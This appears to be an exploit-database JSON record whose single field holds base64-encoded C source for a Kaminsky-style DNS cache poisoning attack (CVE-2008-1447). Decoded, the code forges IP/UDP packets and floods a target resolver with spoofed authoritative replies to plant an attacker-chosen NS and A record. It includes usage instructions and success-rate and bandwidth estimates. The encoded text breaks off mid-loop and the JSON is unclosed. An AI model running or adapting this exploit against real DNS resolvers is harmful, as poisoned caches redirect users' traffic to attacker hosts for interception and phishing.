{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIEV4cGxvaXQgZm9yIENWRS0yMDA4LTE0NDcgLSBLYW1pbnNreSBETlMgQ2FjaGUgUG9pc29uaW5nIEF0dGFjaw0KICoNCiAqIENvbXBpbGF0aW9uOg0KICogJCBnY2MgLW8ga2FtaW5za3ktYXR0YWNrIGthbWluc2t5LWF0dGFjay5jIGBkbmV0LWNvbmZpZyAtLWxpYnNgIC1sbQ0KICoNCiAqIERlcGVuZGVuY3k6IGxpYmRuZXQgKGFrYSBsaWJkdW1ibmV0LWRldiB1bmRlciBVYnVudHUpDQogKg0KICogQXV0aG9yOiBtYXJjLmJldmFuZCBhdCByYXBpZDcgZG90IGNvbQ0KICovDQoNCiNkZWZpbmUgX0JTRF9TT1VSQ0UNCg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPGVyci5oPg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8bWF0aC5oPg0KI2luY2x1ZGUgPHRpbWUuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDxkdW1ibmV0Lmg+DQoNCiNkZWZpbmUgRE5TRl9SRVNQT05TRSAgICAgICgxPDwxNSkNCiNkZWZpbmUgRE5TRl9BVVRIT1JJVEFUSVZFICgxPDwxMCkNCiNkZWZpbmUgRE5TRl9SRUNfREVTSVJFRCAgICgxPDw4KQ0KI2RlZmluZSBETlNGX1JFQ19BVkFJTEFCTEUgKDE8PDcpDQoNCiNkZWZpbmUgVFlQRV9BICAgICAgIDB4MQ0KI2RlZmluZSBUWVBFX05TICAgICAgMHgyDQojZGVmaW5lIENMQVNTX0lOICAgICAweDENCg0Kc3RydWN0IGRuc19wa3QNCnsNCiAgIHVpbnQxNl90IHR4aWQ7DQogICB1aW50MTZfdCBmbGFnczsNCiAgIHVpbnQxNl90IG5yX3F1ZXN0Ow0KICAgdWludDE2X3QgbnJfYW5zOw0KICAgdWludDE2X3QgbnJfYXV0aDsNCiAgIHVpbnQxNl90IG5yX2FkZDsNCn0gX19hdHRyaWJ1dGVfXyAoKF9fcGFja2VkX18pKTsNCg0Kdm9pZCBmb3JtYXRfZG9tYWluKHVfY2hhciAqYnVmLCB1bnNpZ25lZCBzaXplLCB1bnNpZ25lZCAqbGVuLCBjb25zdCBjaGFyICpuYW1lKQ0Kew0KICAgdW5zaWduZWQgYnVmaSwgaSwgajsNCiAgIGJ1ZmkgPSBpID0gaiA9IDA7DQogICB3aGlsZSAobmFtZVtpXSkNCiAgIHsNCiAgICAgIGlmIChuYW1lW2ldID09ICcuJykNCiAgICAgIHsNCiAgICAgICAgIGlmIChidWZpICsgMSArIChpIC0gaikgPiBzaXplKQ0KICAgICAgICAgICAgZnByaW50ZihzdGRlcnIsICJmb3JtYXRfZG9tYWluIG92ZXJmbG93XG4iKSwgZXhpdCgxKTsNCiAgICAgICAgIGJ1ZltidWZpKytdID0gaSAtIGo7DQogICAgICAgICBtZW1jcHkoYnVmICsgYnVmaSwgbmFtZSArIGosIGkgLSBqKTsNCiAgICAgICAgIGJ1ZmkgKz0gaSAtIGo7DQogICAgICAgICBqID0gaSArIDE7DQogICAgICB9DQogICAgICBpKys7DQogICB9DQogICBpZiAoYnVmaSArIDEgKyAyICsgMiA+IHNpemUpDQogICAgICBmcHJpbnRmKHN0ZGVyciwgImZvcm1hdF9kb21haW4gb3ZlcmZsb3dcbiIpLCBleGl0KDEpOw0KICAgYnVmW2J1ZmkrK10gPSAwOw0KICAgKmxlbiA9IGJ1Zmk7DQp9DQoNCnZvaWQgZm9ybWF0X3FyKHVfY2hhciAqYnVmLCB1bnNpZ25lZCBzaXplLCB1bnNpZ25lZCAqbGVuLCBjb25zdCBjaGFyICpuYW1lLCB1aW50MTZfdCB0eXBlLCB1aW50MTZfdCBjbGFzcykNCnsNCiAgIHVpbnQxNl90IHRtcDsNCiAgIC8vIG5hbWUNCiAgIGZvcm1hdF9kb21haW4oYnVmLCBzaXplLCBsZW4sIG5hbWUpOw0KICAgLy8gdHlwZQ0KICAgdG1wID0gaHRvbnModHlwZSk7DQogICBtZW1jcHkoYnVmICsgKmxlbiwgJnRtcCwgc2l6ZW9mICh0bXApKTsNCiAgICpsZW4gKz0gc2l6ZW9mICh0bXApOw0KICAgLy8gY2xhc3MNCiAgIHRtcCA9IGh0b25zKGNsYXNzKTsNCiAgIG1lbWNweShidWYgKyAqbGVuLCAmdG1wLCBzaXplb2YgKHRtcCkpOw0KICAgKmxlbiArPSBzaXplb2YgKHRtcCk7DQp9DQoNCnZvaWQgZm9ybWF0X3JyKHVfY2hhciAqYnVmLCB1bnNpZ25lZCBzaXplLCB1bnNpZ25lZCAqbGVuLCBjb25zdCBjaGFyICpuYW1lLCB1aW50MTZfdCB0eXBlLCB1aW50MTZfdCBjbGFzcywgdWludDMyX3QgdHRsLCBjb25zdCBjaGFyICpkYXRhKQ0Kew0KICAgZm9ybWF0X3FyKGJ1Ziwgc2l6ZSwgbGVuLCBuYW1lLCB0eXBlLCBjbGFzcyk7DQogICAvLyB0dGwNCiAgIHR0bCA9IGh0b25sKHR0bCk7DQogICBtZW1jcHkoYnVmICsgKmxlbiwgJnR0bCwgc2l6ZW9mICh0dGwpKTsNCiAgICpsZW4gKz0gc2l6ZW9mICh0dGwpOw0KICAgLy8gZGF0YSBsZW5ndGggKyBkYXRhDQogICB1aW50MTZfdCBkbGVuOw0KICAgc3RydWN0IGFkZHIgYWRkcjsNCiAgIHN3aXRjaCAodHlwZSkNCiAgIHsNCiAgICAgIGNhc2UgVFlQRV9BOg0KICAgICAgICAgZGxlbiA9IHNpemVvZiAoYWRkci5hZGRyX2lwKTsNCiAgICAgICAgIGJyZWFrOw0KICAgICAgY2FzZSBUWVBFX05TOg0KICAgICAgICAgZGxlbiA9IHN0cmxlbihkYXRhKSArIDE7DQogICAgICAgICBicmVhazsNCiAgICAgIGRlZmF1bHQ6DQogICAgICAgICBmcHJpbnRmKHN0ZGVyciwgImZvcm1hdF9ycjogdW5rbm93biB0eXBlICUwMngiLCB0eXBlKTsNCiAgICAgICAgIGV4aXQoMSk7DQogICB9DQogICBkbGVuID0gaHRvbnMoZGxlbik7DQogICBtZW1jcHkoYnVmICsgKmxlbiwgJmRsZW4sIHNpemVvZiAoZGxlbikpOw0KICAgKmxlbiArPSBzaXplb2YgKGRsZW4pOw0KICAgLy8gZGF0YQ0KICAgdW5zaWduZWQgbGVuMjsNCiAgIHN3aXRjaCAodHlwZSkNCiAgIHsNCiAgICAgIGNhc2UgVFlQRV9BOg0KICAgICAgICAgaWYgKGFkZHJfYXRvbihkYXRhLCAmYWRkcikgPCAwKQ0KICAgICAgICAgICAgZnByaW50ZihzdGRlcnIsICJpbnZhbGlkIGRlc3RpbmF0aW9uIElQOiAlcyIsIGRhdGEpLCBleGl0KDEpOw0KICAgICAgICAgbWVtY3B5KGJ1ZiArICpsZW4sICZhZGRyLmFkZHJfaXAsIHNpemVvZiAoYWRkci5hZGRyX2lwKSk7DQogICAgICAgICAqbGVuICs9IHNpemVvZiAoYWRkci5hZGRyX2lwKTsNCiAgICAgICAgIGJyZWFrOw0KICAgICAgY2FzZSBUWVBFX05TOg0KICAgICAgICAgZm9ybWF0X2RvbWFpbihidWYgKyAqbGVuLCBzaXplIC0gKmxlbiwgJmxlbjIsIGRhdGEpOw0KICAgICAgICAgKmxlbiArPSBsZW4yOw0KICAgICAgICAgYnJlYWs7DQogICAgICBkZWZhdWx0Og0KICAgICAgICAgZnByaW50ZihzdGRlcnIsICJmb3JtYXRfcnI6IHVua25vd24gdHlwZSAlMDJ4IiwgdHlwZSk7DQogICAgICAgICBleGl0KDEpOw0KICAgfQ0KfQ0KDQp2b2lkIGRuc19xdWVyeSh1X2NoYXIgKmJ1ZiwgdW5zaWduZWQgc2l6ZSwgdW5zaWduZWQgKmxlbiwgdWludDE2X3QgdHhpZCwgdWludDE2X3QgZmxhZ3MsIGNvbnN0IGNoYXIgKm5hbWUpDQp7DQogICB1X2NoYXIgKm91dCA9IGJ1ZjsNCiAgIHN0cnVjdCBkbnNfcGt0IHAgPSB7DQogICAgICAudHhpZCA9IGh0b25zKHR4aWQpLA0KICAgICAgLmZsYWdzID0gaHRvbnMoZmxhZ3MpLA0KICAgICAgLm5yX3F1ZXN0ID0gaHRvbnMoMSksDQogICAgICAubnJfYW5zID0gaHRvbnMoMCksDQogICAgICAubnJfYXV0aCA9IGh0b25zKDApLA0KICAgICAgLm5yX2FkZCA9IGh0b25zKDApLA0KICAgfTsNCiAgIHVfY2hhciBxclsyNTZdOw0KICAgdW5zaWduZWQgbDsNCiAgIGZvcm1hdF9xcihxciwgc2l6ZW9mIChxciksICZsLCBuYW1lLCBUWVBFX0EsIENMQVNTX0lOKTsNCiAgIGlmIChzaXplb2YgKHApICsgbCA+IHNpemUpDQogICAgICBmcHJpbnRmKHN0ZGVyciwgImRuc19xdWVyeSBvdmVyZmxvdyIpLCBleGl0KDEpOw0KICAgbWVtY3B5KG91dCwgJnAsIHNpemVvZiAocCkpOw0KICAgb3V0ICs9IHNpemVvZiAocCk7DQogICBtZW1jcHkob3V0LCBxciwgbCk7DQogICBvdXQgKz0gbDsNCiAgICpsZW4gPSBzaXplb2YgKHApICsgbDsNCn0NCg0Kdm9pZCBkbnNfcmVzcG9uc2UodV9jaGFyICpidWYsIHVuc2lnbmVkIHNpemUsIHVuc2lnbmVkICpsZW4sDQogICAgICB1aW50MTZfdCB0eGlkLCB1aW50MTZfdCBmbGFncywNCiAgICAgIGNvbnN0IGNoYXIgKnFfbmFtZSwgY29uc3QgY2hhciAqcV9pcCwNCiAgICAgIGNvbnN0IGNoYXIgKmRvbWFpbiwgY29uc3QgY2hhciAqYXV0aF9uYW1lLCBjb25zdCBjaGFyICphdXRoX2lwKQ0Kew0KICAgdV9jaGFyICpvdXQgPSBidWY7DQogICB1X2NoYXIgKmVuZCA9IGJ1ZiArIHNpemU7DQogICB1X2NoYXIgcmVjWzI1Nl07DQogICB1bnNpZ25lZCBsX3JlYzsNCiAgIHVpbnQzMl90IHR0bCA9IDI0KjM2MDA7DQogICBzdHJ1Y3QgZG5zX3BrdCBwID0gew0KICAgICAgLnR4aWQgPSBodG9ucyh0eGlkKSwNCiAgICAgIC5mbGFncyA9IGh0b25zKGZsYWdzKSwNCiAgICAgIC5ucl9xdWVzdCA9IGh0b25zKDEpLA0KICAgICAgLm5yX2FucyA9IGh0b25zKDEpLA0KICAgICAgLm5yX2F1dGggPSBodG9ucygxKSwNCiAgICAgIC5ucl9hZGQgPSBodG9ucygxKSwNCiAgIH07DQogICAodm9pZClkb21haW47DQogICAqbGVuID0gMDsNCiAgIGlmIChvdXQgKyAqbGVuICsgc2l6ZW9mIChwKSA+IGVuZCkNCiAgICAgIGZwcmludGYoc3RkZXJyLCAiZG5zX3Jlc3BvbnNlIG92ZXJmbG93IiksIGV4aXQoMSk7DQogICBtZW1jcHkob3V0ICsgKmxlbiwgJnAsIHNpemVvZiAocCkpOyAqbGVuICs9IHNpemVvZiAocCk7DQogICAvLyBxdWVyaWVzDQogICBmb3JtYXRfcXIocmVjLCBzaXplb2YgKHJlYyksICZsX3JlYywgcV9uYW1lLCBUWVBFX0EsIENMQVNTX0lOKTsNCiAgIGlmIChvdXQgKyAqbGVuICsgbF9yZWMgPiBlbmQpDQogICAgICBmcHJpbnRmKHN0ZGVyciwgImRuc19yZXNwb25zZSBvdmVyZmxvdyIpLCBleGl0KDEpOw0KICAgbWVtY3B5KG91dCArICpsZW4sIHJlYywgbF9yZWMpOyAqbGVuICs9IGxfcmVjOw0KICAgLy8gYW5zd2Vycw0KICAgZm9ybWF0X3JyKHJlYywgc2l6ZW9mIChyZWMpLCAmbF9yZWMsIHFfbmFtZSwgVFlQRV9BLCBDTEFTU19JTiwNCiAgICAgICAgIHR0bCwgcV9pcCk7DQogICBpZiAob3V0ICsgKmxlbiArIGxfcmVjID4gZW5kKQ0KICAgICAgZnByaW50ZihzdGRlcnIsICJkbnNfcmVzcG9uc2Ugb3ZlcmZsb3ciKSwgZXhpdCgxKTsNCiAgIG1lbWNweShvdXQgKyAqbGVuLCByZWMsIGxfcmVjKTsgKmxlbiArPSBsX3JlYzsNCiAgIC8vIGF1dGhvcml0YXRpdmUgbmFtZXNlcnZlcnMNCiAgIGZvcm1hdF9ycihyZWMsIHNpemVvZiAocmVjKSwgJmxfcmVjLCBkb21haW4sIFRZUEVfTlMsIENMQVNTX0lOLA0KICAgICAgICAgdHRsLCBhdXRoX25hbWUpOw0KICAgaWYgKG91dCArICpsZW4gKyBsX3JlYyA+IGVuZCkNCiAgICAgIGZwcmludGYoc3RkZXJyLCAiZG5zX3Jlc3BvbnNlIG92ZXJmbG93IiksIGV4aXQoMSk7DQogICBtZW1jcHkob3V0ICsgKmxlbiwgcmVjLCBsX3JlYyk7ICpsZW4gKz0gbF9yZWM7DQogICAvLyBhZGRpdGlvbmFsIHJlY29yZHMNCiAgIGZvcm1hdF9ycihyZWMsIHNpemVvZiAocmVjKSwgJmxfcmVjLCBhdXRoX25hbWUsIFRZUEVfQSwgQ0xBU1NfSU4sDQogICAgICAgICB0dGwsIGF1dGhfaXApOw0KICAgaWYgKG91dCArICpsZW4gKyBsX3JlYyA+IGVuZCkNCiAgICAgIGZwcmludGYoc3RkZXJyLCAiZG5zX3Jlc3BvbnNlIG92ZXJmbG93IiksIGV4aXQoMSk7DQogICBtZW1jcHkob3V0ICsgKmxlbiwgcmVjLCBsX3JlYyk7ICpsZW4gKz0gbF9yZWM7DQp9DQoNCnVuc2lnbmVkIGJ1aWxkX3F1ZXJ5KHVfY2hhciAqYnVmLCBjb25zdCBjaGFyICpzcmNpcCwgY29uc3QgY2hhciAqZHN0aXAsIGNvbnN0IGNoYXIgKm5hbWUpDQp7DQogICB1bnNpZ25lZCBsZW4gPSAwOw0KICAgLy8gaXANCiAgIHN0cnVjdCBpcF9oZHIgKmlwID0gKHN0cnVjdCBpcF9oZHIgKilidWY7DQogICBpcC0+aXBfaGwgPSA1Ow0KICAgaXAtPmlwX3YgPSA0Ow0KICAgaXAtPmlwX3RvcyA9IDA7DQogICBpcC0+aXBfaWQgPSByYW5kKCkgJiAweGZmZmY7DQogICBpcC0+aXBfb2ZmID0gMDsNCiAgIGlwLT5pcF90dGwgPSBJUF9UVExfTUFYOw0KICAgaXAtPmlwX3AgPSAxNzsgLy8gdWRwDQogICBpcC0+aXBfc3VtID0gMDsNCiAgIHN0cnVjdCBhZGRyIGFkZHI7DQogICBpZiAoYWRkcl9hdG9uKHNyY2lwLCAmYWRkcikgPCAwKQ0KICAgICAgZnByaW50ZihzdGRlcnIsICJpbnZhbGlkIHNvdXJjZSBJUDogJXMiLCBzcmNpcCksIGV4aXQoMSk7DQogICBpcC0+aXBfc3JjID0gYWRkci5hZGRyX2lwOw0KICAgaWYgKGFkZHJfYXRvbihkc3RpcCwgJmFkZHIpIDwgMCkNCiAgICAgIGZwcmludGYoc3RkZXJyLCAiaW52YWxpZCBkZXN0aW5hdGlvbiBJUDogJXMiLCBkc3RpcCksIGV4aXQoMSk7DQogICBpcC0+aXBfZHN0ID0gYWRkci5hZGRyX2lwOw0KICAgLy8gdWRwDQogICBzdHJ1Y3QgdWRwX2hkciAqdWRwID0gKHN0cnVjdCB1ZHBfaGRyICopKGJ1ZiArIElQX0hEUl9MRU4pOw0KICAgdWRwLT51aF9zcG9ydCA9IGh0b25zKDEyMzQpOw0KICAgdWRwLT51aF9kcG9ydCA9IGh0b25zKDUzKTsNCiAgIC8vIGRucw0KICAgZG5zX3F1ZXJ5KGJ1ZiArIElQX0hEUl9MRU4gKyBVRFBfSERSX0xFTiwNCiAgICAgICAgICh1bnNpZ25lZCkoc2l6ZW9mIChidWYpIC0gKElQX0hEUl9MRU4gKyBVRFBfSERSX0xFTikpLCAmbGVuLA0KICAgICAgICAgcmFuZCgpLCBETlNGX1JFQ19ERVNJUkVELCBuYW1lKTsNCiAgIC8vIHVkcCBsZW4NCiAgIGxlbiArPSBVRFBfSERSX0xFTjsNCiAgIHVkcC0+dWhfdWxlbiA9IGh0b25zKGxlbik7DQogICAvLyBpcCBsZW4gJiBja3N1bQ0KICAgbGVuICs9IElQX0hEUl9MRU47DQogICBpcC0+aXBfbGVuID0gaHRvbnMobGVuKTsNCiAgIGlwX2NoZWNrc3VtKGJ1ZiwgbGVuKTsNCiAgIHJldHVybiBsZW47DQp9DQoNCnVuc2lnbmVkIGJ1aWxkX3Jlc3BvbnNlKHVfY2hhciAqYnVmLCBjb25zdCBjaGFyICpzcmNpcCwgY29uc3QgY2hhciAqZHN0aXAsDQogICAgICB1aW50MTZfdCBwb3J0X3Jlc29sdmVyLCB1aW50MTZfdCB0eGlkLA0KICAgICAgY29uc3QgY2hhciAqcV9uYW1lLCBjb25zdCBjaGFyICpxX2lwLA0KICAgICAgY29uc3QgY2hhciAqZG9tYWluLCBjb25zdCBjaGFyICphdXRoX25hbWUsIGNvbnN0IGNoYXIgKmF1dGhfaXApDQp7DQogICB1bnNpZ25lZCBsZW4gPSAwOw0KICAgLy8gaXANCiAgIHN0cnVjdCBpcF9oZHIgKmlwID0gKHN0cnVjdCBpcF9oZHIgKilidWY7DQogICBpcC0+aXBfaGwgPSA1Ow0KICAgaXAtPmlwX3YgPSA0Ow0KICAgaXAtPmlwX3RvcyA9IDA7DQogICBpcC0+aXBfaWQgPSByYW5kKCkgJiAweGZmZmY7DQogICBpcC0+aXBfb2ZmID0gMDsNCiAgIGlwLT5pcF90dGwgPSBJUF9UVExfTUFYOw0KICAgaXAtPmlwX3AgPSAxNzsgLy8gdWRwDQogICBpcC0+aXBfc3VtID0gMDsNCiAgIHN0cnVjdCBhZGRyIGFkZHI7DQogICBpZiAoYWRkcl9hdG9uKHNyY2lwLCAmYWRkcikgPCAwKQ0KICAgICAgZnByaW50ZihzdGRlcnIsICJpbnZhbGlkIHNvdXJjZSBJUDogJXMiLCBzcmNpcCksIGV4aXQoMSk7DQogICBpcC0+aXBfc3JjID0gYWRkci5hZGRyX2lwOw0KICAgaWYgKGFkZHJfYXRvbihkc3RpcCwgJmFkZHIpIDwgMCkNCiAgICAgIGZwcmludGYoc3RkZXJyLCAiaW52YWxpZCBkZXN0aW5hdGlvbiBJUDogJXMiLCBkc3RpcCksIGV4aXQoMSk7DQogICBpcC0+aXBfZHN0ID0gYWRkci5hZGRyX2lwOw0KICAgLy8gdWRwDQogICBzdHJ1Y3QgdWRwX2hkciAqdWRwID0gKHN0cnVjdCB1ZHBfaGRyICopKGJ1ZiArIElQX0hEUl9MRU4pOw0KICAgdWRwLT51aF9zcG9ydCA9IGh0b25zKDUzKTsNCiAgIHVkcC0+dWhfZHBvcnQgPSBodG9ucyhwb3J0X3Jlc29sdmVyKTsNCiAgIC8vIGRucw0KICAgZG5zX3Jlc3BvbnNlKGJ1ZiArIElQX0hEUl9MRU4gKyBVRFBfSERSX0xFTiwNCiAgICAgICAgICh1bnNpZ25lZCkoc2l6ZW9mIChidWYpIC0gKElQX0hEUl9MRU4gKyBVRFBfSERSX0xFTikpLCAmbGVuLA0KICAgICAgICAgdHhpZCwgRE5TRl9SRVNQT05TRSB8IEROU0ZfQVVUSE9SSVRBVElWRSwNCiAgICAgICAgIHFfbmFtZSwgcV9pcCwgZG9tYWluLCBhdXRoX25hbWUsIGF1dGhfaXApOw0KICAgLy8gdWRwIGxlbg0KICAgbGVuICs9IFVEUF9IRFJfTEVOOw0KICAgdWRwLT51aF91bGVuID0gaHRvbnMobGVuKTsNCiAgIC8vIGlwIGxlbiAmIGNrc3VtDQogICBsZW4gKz0gSVBfSERSX0xFTjsNCiAgIGlwLT5pcF9sZW4gPSBodG9ucyhsZW4pOw0KICAgaXBfY2hlY2tzdW0oYnVmLCBsZW4pOw0KICAgcmV0dXJuIGxlbjsNCn0NCg0Kdm9pZCB1c2FnZShjaGFyICpuYW1lKQ0Kew0KICAgZnByaW50ZihzdGRlcnIsICJVc2FnZTogJXMgPGlwLXF1ZXJpZXI+IDxpcC1yZXNvbHZlcj4gPGlwLWF1dGhvcml0YXRpdmU+ICINCiAgICAgICAgICI8cG9ydC1yZXNvbHZlcj4gPHN1Ymhvc3Q+IDxkb21haW4+IDxhbnktaXA+IDxhdHRlbXB0cz4gPHJlcGwtcGVyLWF0dGVtcHQ+XG4iDQogICAgICAgICAiICA8aXAtcXVlcmllcj4gICAgICAgU291cmNlIElQIHVzZWQgd2hlbiBzZW5kaW5nIHF1ZXJpZXMgZm9yIHJhbmRvbSBob3N0bmFtZXNcbiINCiAgICAgICAgICIgICAgICAgICAgICAgICAgICAgICAodHlwaWNhbGx5IHlvdXIgSVApXG4iDQogICAgICAgICAiICA8aXAtcmVzb2x2ZXI+ICAgICAgVGFyZ2V0IEROUyByZXNvbHZlciB0byBhdHRhY2tcbiINCiAgICAgICAgICIgIDxpcC1hdXRob3JpdGF0aXZlPiBPbmUgb2YgdGhlIGF1dGhvcml0YXRpdmUgRE5TIHNlcnZlcnMgZm9yIDxkb21haW4+XG4iDQogICAgICAgICAiICA8cG9ydC1yZXNvbHZlcj4gICAgU291cmNlIHBvcnQgdXNlZCBieSB0aGUgcmVzb2x2ZXIgd2hlbiBmb3J3YXJkaW5nIHF1ZXJpZXNcbiINCiAgICAgICAgICIgIDxzdWJob3N0PiAgICAgICAgICBQb2lzb24gdGhlIGNhY2hlIHdpdGggdGhlIEEgcmVjb3JkIDxzdWJob3N0Pi48ZG9tYWluPlxuIg0KICAgICAgICAgIiAgPGRvbWFpbj4gICAgICAgICAgIERvbWFpbiBuYW1lLCBzZWUgPHN1Ymhvc3Q+LlxuIg0KICAgICAgICAgIiAgPGFueS1pcD4gICAgICAgICAgIElQIG9mIHlvdXIgY2hvaWNlIHRvIGJlIGFzc29jaWF0ZWQgdG8gPHN1Ymhvc3Q+Ljxkb21haW4+XG4iDQogICAgICAgICAiICA8YXR0ZW1wdHM+ICAgICAgICAgTnVtYmVyIG9mIHBvaXNvbmluZyBhdHRlbXBzLCBtb3JlIGF0dGVtcHRzIGluY3JlYXNlIHRoZVxuIg0KICAgICAgICAgIiAgICAgICAgICAgICAgICAgICAgIGNoYW5jZSBvZiBzdWNjZXNzZnVsIHBvaXNvbmluZywgYnV0IGFsc28gdGhlIGF0dGFjayB0aW1lXG4iDQogICAgICAgICAiICA8cmVwbC1wZXItYXR0ZW1wdD4gTnVtYmVyIG9mIHNwb29mZWQgcmVwbGllcyB0byBzZW5kIHBlciBhdHRlbXB0LCBtb3JlIHJlcGxpZXNcbiINCiAgICAgICAgICIgICAgICAgICAgICAgICAgICAgICBpbmNyZWFzZSB0aGUgY2hhbmNlIG9mIHN1Y2Nlc3NmdWwgcG9pc29uaW5nIGJ1dCwgYnV0IGFsc29cbiINCiAgICAgICAgICIgICAgICAgICAgICAgICAgICAgICB0aGUgcmF0ZSBvZiBwYWNrZXQgbG9zc1xuIg0KICAgICAgICAgIkV4YW1wbGU6XG4iDQogICAgICAgICAiICAkICVzIHEucS5xLnEgci5yLnIuciBhLmEuYS5hIDEyMzQgcHduZWQgZXhhbXBsZS5jb20uIDEuMS4xLjEgODE5MiAxNlxuIg0KICAgICAgICAgIlRoaXMgc2hvdWxkIGNhdXNlIGEgcHduZWQuZXhhbXBsZS5jb20gQSByZWNvcmQgcmVzb2x2aW5nIHRvIDEuMS4xLjEgdG8gYXBwZWFyXG4iDQogICAgICAgICAiaW4gci5yLnIucidzIGNhY2hlLiBUaGUgY2hhbmNlIG9mIHN1Y2Nlc3NmdWxseSBwb2lzb25pbmcgdGhlIHJlc29sdmVyIHdpdGhcbiINCiAgICAgICAgICJ0aGlzIGV4YW1wbGUgKDgxOTIgYXR0ZW1wdHMgYW5kIDE2IHJlcGxpZXMvYXR0ZW1wdCkgaXMgODYlJVxuIg0KICAgICAgICAgIigxLSgxLTE2LzY1NTM2KSoqODE5MikuIFRoaXMgZXhhbXBsZSBhbHNvIHJlcXVpcmVzIGEgYmFuZHdpZHRoIG9mIGFib3V0XG4iDQogICAgICAgICAiMi42IE1iaXQvcyAoMTYgcmVwbGllcy9hdHRlbXB0ICogfjIwMCBieXRlcy9yZXBseSAqIDEwMCBhdHRlbXB0cy9zZWMgKlxuIg0KICAgICAgICAgIjggYml0cy9ieXRlKSBhbmQgdGFrZXMgYWJvdXQgODAgc2VjcyB0byBjb21wbGV0ZSAoODE5MiBhdHRlbXB0cyAvXG4iDQogICAgICAgICAiMTAwIGF0dGVtcHRzL3NlYykuXG4iLA0KICAgICAgICAgbmFtZSwgbmFtZSk7DQp9DQoNCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikNCnsNCiAgIGlmIChhcmdjICE9IDEwKQ0KICAgICAgdXNhZ2UoYXJndlswXSksIGV4aXQoMSk7DQogICBjb25zdCBjaGFyICpxdWVyaWVyID0gYXJndlsxXTsNCiAgIGNvbnN0IGNoYXIgKmlwX3Jlc29sdmVyID0gYXJndlsyXTsNCiAgIGNvbnN0IGNoYXIgKmlwX2F1dGhvcml0YXRpdmUgPSBhcmd2WzNdOw0KICAgdWludDE2X3QgcG9ydF9yZXNvbHZlciA9ICh1aW50MTZfdClzdHJ0b3VsKGFyZ3ZbNF0sIE5VTEwsIDApOw0KICAgY29uc3QgY2hhciAqc3ViaG9zdCA9IGFyZ3ZbNV07DQogICBjb25zdCBjaGFyICpkb21haW4gPSBhcmd2WzZdOw0KICAgY29uc3QgY2hhciAqYW55aXAgPSBhcmd2WzddOw0KICAgdWludDE2X3QgYXR0ZW1wdHMgPSAodWludDE2X3Qpc3RydG91bChhcmd2WzhdLCBOVUxMLCAwKTsNCiAgIHVpbnQxNl90IHJlcGxpZXMgPSAodWludDE2X3Qpc3RydG91bChhcmd2WzldLCBOVUxMLCAwKTsNCiAgIGlmIChkb21haW5bc3RybGVuKGRvbWFpbikgLSAxIF0gIT0gJy4nKQ0KICAgICAgZnByaW50ZihzdGRlcnIsICJkb21haW4gbXVzdCBlbmQgd2l0aCBkb3QoLik6ICVzXG4iLCBkb21haW4pLCBleGl0KDEpOw0KICAgcHJpbnRmKCJDaGFuY2Ugb2Ygc3VjY2VzczogMS0oMS0lZC82NTUzNikqKiVkID0gJS4yZlxuIiwgcmVwbGllcywgYXR0ZW1wdHMsIDEgLSBwb3coKDEgLSByZXBsaWVzIC8gNjU1MzYuKSwgYXR0ZW1wdHMpKTsNCiAgIHNyYW5kKHRpbWUoTlVMTCkpOw0KICAgaW50IHVuaXF1ZSA9IHJhbmQoKSArIChyYW5kKCkgPDwgMTYpOw0KICAgdV9jaGFyIGJ1ZltJUF9MRU5fTUFYXTsNCiAgIHVuc2lnbmVkIGxlbjsNCiAgIGNoYXIgbmFtZVsyNTZdOw0KICAgY2hhciBuc1syNTZdOw0KICAgaXBfdCAqaXBoOw0KICAgaWYgKChpcGggPSBpcF9vcGVuKCkpID09IE5VTEwpDQogICAgICBlcnIoMSwgImlwX29wZW4iKTsNCiAgIGludCBjbnQgPSAwOw0KICAgd2hpbGUgKGNudCA8IGF0dGVtcHRzKQ0KICAgew0KICAgICAgLy8gc2VuZCBhIHF1ZXJ5IGZvciBhIHJhbmRvbSBob3N0bmFtZQ0KICAgICAgc25wcmludGYobmFtZSwgc2l6ZW9mIChuYW1lKSwgIiUwOHglMDh4LiVzIiwgdW5pcXVlLCBjbnQsIGRvbWFpbik7DQogICAgICBsZW4gPSBidWlsZF9xdWVyeShidWYsIHF1ZXJpZXIsIGlwX3Jlc29sdmVyLCBuYW1lKTsNCiAgICAgIGlmIChpcF9zZW5kKGlwaCwgYnVmLCBsZW4pICE9IGxlbikNCiAgICAgICAgIGVycigxLCAiaXBfc2VuZCIpOw0KICAgICAgLy8gZ2l2ZSB0aGUgcmVzb2x2ZXIgZW5vdWdoIHRpbWUgdG8gZm9yd2FyZCB0aGUgcXVlcnkgYW5kIGJlIGluIGEgc3RhdGUNCiAgICAgIC8vIHdoZXJlIGl0IHdhaXRzIGZvciBhbnN3ZXJzOyBzbGVlcGluZyAxMG1zIGhlcmUgbGltaXRzIHRoZSBudW1iZXIgb2YNCiAgICAgIC8vIGF0dGVtcHRzIHRvIDEwMCBwZXIgc2VjDQogICAgICB1c2xlZXAoMTAwMDApOw0KICAgICAgLy8gc2VuZCBzcG9vZmVkIHJlcGxpZXMsIGVhY2ggcmVwbHkgY29udGFpbnM6DQogICAgICAvLyAtIDEgcXVlcnk6IHF1ZXJ5IGZvciB0aGUgInJhbmRvbSBob3N0bmFtZSINCiAgICAgIC8vIC0gMSBhbnN3ZXI6ICJyYW5kb20gaG9zdG5hbWUiIEEgMS4xLjEuMQ0KICAgICAgLy8gLSAxIGF1dGhvcml0YXRpdmUgbmFtZXNlcnZlcjogPGRvbWFpbj4gTlMgPHN1Ymhvc3Q+Ljxkb21haW4+DQogICAgICAvLyAtIDEgYWRkaXRpb25hbCByZWNvcmQ6IDxzdWJob3N0Pi48ZG9tYWluPiBBIDxhbnktaXA+DQogICAgICBzbnByaW50Zihucywgc2l6ZW9mIChucyksICIlcy4lcyIsIHN1Ymhvc3QsIGRvbWFpbik7DQogICAgICB1bnNpZ25lZCByOw0KICAgICAgZm9yIChyID0gMDsgciA8IHJlcGxpZXM7IHIrKykNCiAgICAgIHsNCiAgICAgICAgIC8vIHVzZSBhIHR4aWQgdGhhdCBpcyBqdXN0ICdyJzogMC4uKHJlcGxpZXMtMSkNCiAgICAgICAgIGxlbiA9IGJ1aWxkX3Jlc3BvbnNlKGJ1ZiwgaXBfYXV0aG9yaXRhdGl2ZSwgaXBfcmVzb2x2ZXIs